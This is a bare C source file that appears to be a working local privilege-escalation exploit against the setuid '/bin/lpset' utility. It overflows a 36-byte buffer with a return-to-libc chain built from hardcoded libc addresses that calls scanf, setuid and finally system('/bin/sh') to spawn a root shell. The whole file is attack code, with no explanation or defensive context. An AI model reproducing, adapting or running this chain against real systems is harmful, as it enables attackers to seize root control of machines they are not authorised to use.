#define BASE 0xdff40000
#define STACK 0x8047e30
#define BUFSIZE 36     

#define SYSTEM (BASE + 0x5b328)
#define SCANF  (BASE + 0x5ae80)
#define SETUID (BASE + 0x30873)
#define PERCD  (BASE + 0x83754)
#define BINSH  (BASE + 0x83654)
#define POP3   (SYSTEM + 610)  
#define POP2   (SYSTEM + 611)  
#define POP1   (SYSTEM + 612)  

int
main()
{     
    unsigned char expbuf[1024];
    char *env[1]; 
    int *p, i;    
    
    memset(expbuf, 'a', BUFSIZE);
    p = (int *)(expbuf + BUFSIZE);
    
    *p++ = STACK;
    *p++ = SCANF + 1;
    *p++ = STACK + 6 * 4;
    *p++ = POP2; 
    *p++ = PERCD;
    *p++ = STACK + 9 * 4;
    
    *p++ = STACK + 10 * 4;
    *p++ = SETUID; 
    *p++ = POP1;   
    *p++ = 0x33333333;
    *p++ = STACK + 15 * 4;
    
    *p++ = SYSTEM;
    *p++ = 0x33333333;
    *p++ = BINSH;     
    *p = 0;
    
    env[0] = 0;
    execle("/bin/lpset", "/bin/lpset", "-n", "fns", "-r", expbuf, "123", 0,
           env);       
    return 0;
}
